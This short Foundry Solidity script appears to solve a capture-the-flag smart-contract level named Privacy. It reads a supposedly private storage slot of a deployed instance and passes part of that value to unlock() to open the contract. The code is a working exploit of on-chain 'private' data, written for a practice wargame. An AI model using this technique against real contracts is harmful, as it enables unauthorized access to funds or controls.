// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/12_IPrivacy.sol";

address constant INSTANCE = 0xC29e98FfDDb061EB95E4065b4c081a3D590e124F;

contract PrivacyPOCScript is Script {
    IPrivacy instance = IPrivacy(INSTANCE);

    function run() external {
        vm.startBroadcast();

        assert(instance.locked());

        instance.unlock(bytes16(vm.load(INSTANCE, 0x0000000000000000000000000000000000000000000000000000000000000005)));

        assert(!instance.locked());

        vm.stopBroadcast();
    }
}
